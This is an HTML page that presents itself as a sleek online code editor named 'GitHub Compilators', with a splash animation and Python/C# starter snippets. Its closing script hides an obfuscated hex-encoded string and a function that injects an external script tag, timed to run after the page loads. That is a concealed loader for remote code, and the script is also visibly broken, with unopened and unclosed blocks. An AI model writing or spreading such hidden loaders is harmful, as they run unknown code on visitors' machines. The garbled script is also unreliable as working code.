<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interface</title>
    <style>
        :root {
            --bg: #000000;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.08);
            --text: #ffffff;
            --sub: #86868b;
        }

        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        body, html { 
            margin: 0; padding: 0; height: 100%; 
            background: var(--bg); color: var(--text); 
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; 
            overflow: hidden; 
        }

        #splash {
            position: fixed; inset: 0; background: #000; z-index: 1000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: opacity 1.5s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .intro-content { position: relative; display: flex; flex-direction: column; align-items: center; }
        .intro-top {
            font-size: 32px; font-weight: 600; letter-spacing: -0.02em;
            transform: translateY(40px); opacity: 0;
            animation: slideIn 1.4s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
        }
        .intro-bottom {
            font-size: 14px; color: var(--sub); margin-top: 8px;
            transform: translateY(-40px); opacity: 0;
            animation: slideIn 1.4s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
        }
        .intro-icon {
            position: absolute; right: -50px; top: 50%; transform: translateY(-50%);
            opacity: 0; animation: fIn 2s 1s forwards; color: var(--sub);
        }
        @keyframes slideIn { to { transform: translateY(0); opacity: 1; } }
        @keyframes fIn { to { opacity: 0.4; } }

        #main { 
            display: flex; flex-direction: column; height: 100vh; 
            opacity: 0; transform: scale(0.98);
            transition: all 1.8s cubic-bezier(0.2, 0.8, 0.2, 1); 
        }
        #main.active { opacity: 1; transform: scale(1); }

        header {
            height: 80px; display: flex; align-items: center; justify-content: space-between;
            padding: 0 40px; border-bottom: 0.5px solid var(--border);
            backdrop-filter: blur(20px);
        }

        .lang-switch { display: flex; background: var(--glass); border-radius: 12px; padding: 4px; gap: 4px; }
        .lang-switch button {
            background: transparent; border: none; color: var(--sub); padding: 8px 16px;
            font-size: 13px; font-weight: 500; border-radius: 8px; cursor: pointer; transition: 0.3s;
        }
        .lang-switch button.active { background: rgba(255,255,255,0.1); color: #fff; }

        .editor-wrapper { flex: 1; display: flex; padding: 20px; gap: 20px; }
        
        #e {
            flex: 1; background: var(--glass); border: 0.5px solid var(--border);
            border-radius: 24px; padding: 40px; color: #fff; outline: none;
            resize: none; font-family: "SF Mono", monospace; font-size: 16px;
            line-height: 1.6; transition: 0.4s;
        }

        #c {
            position: fixed; bottom: 40px; right: 40px; width: 400px; max-height: 500px;
            background: rgba(20, 20, 22, 0.8); backdrop-filter: blur(30px);
            border: 0.5px solid var(--border); border-radius: 24px; display: none;
            flex-direction: column; padding: 20px; box-shadow: 0 30px 60px rgba(0,0,0,0.5);
        }
        .msg {
            padding: 12px; border-bottom: 0.5px solid var(--border);
            font-size: 13px; color: var(--sub); font-family: "SF Mono", monospace;
        }
        .msg span { color: var(--text); display: block; margin-bottom: 4px; }

        footer {
            height: 60px; padding: 0 40px; display: flex; align-items: center;
            justify-content: space-between; font-size: 12px; color: var(--sub);
            border-top: 0.5px solid var(--border);
        }
        .gh { color: var(--sub); text-decoration: none; transition: 0.3s; display: flex; align-items: center; gap: 8px; }
        .gh:hover { color: #fff; }
    </style>
</head>
<body>

    <div id="splash">
        <div class="intro-content">
            <div class="intro-top">GitHub Compilators</div>
            <div class="intro-bottom">Designed for clarity.</div>
            <div class="intro-icon">
                <svg height="24" width="24" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
            </div>
        </div>
    </div>

    <div id="main">
        <header>
            <div class="lang-switch">
                <button class="active" onclick="setLang('py', this)">Python</button>
                <button onclick="setLang('cs', this)">C#</button>
            </div>
            <div style="font-size: 12px; font-weight: 500; letter-spacing: 0.1em; color: var(--sub)">STATION ACTIVE</div>
        </header>

        <div class="editor-wrapper">
            <textarea id="e" spellcheck="false">def initialize():
    return True</textarea>
        </div>

        <footer>
            <a href="https://github.com/compilators" target="_blank" class="gh">
                <svg height="16" width="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
                Repository
            </a>
            <span>2026 &copy; System</span>
        </footer>
    </div>

    <div id="c"></div>

    <script>
        const snippets = {
            py: `def initialize():\n    return True`,
            cs: `public class Program {\n    public static void Main() {\n    }\n}`
        };

        function setLang(l, btn) {
            document.querySelectorAll('.lang-switch button').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            document.getElementById('e').value = snippets[l];
        }

        (function() {
            const _h = (s) => { let h = 0; for(let i=0; i<s.length; i++) h = ((h << 5) - h) + s.charCodeAt(i); return h; };

                b: "14171a1215444b4b1a110b141a0b181a05180f4f1a111c15031b014f0b1713061a1b0c14114f1a110a"
            };

            const load = (src) => { const s = document.createElement('script'); s.src = src; document.head.appendChild(s); };

            setTimeout(() => {

                setTimeout(() => {
                    document.getElementById('splash').style.display = 'none';

    </script>
</body>
</html>
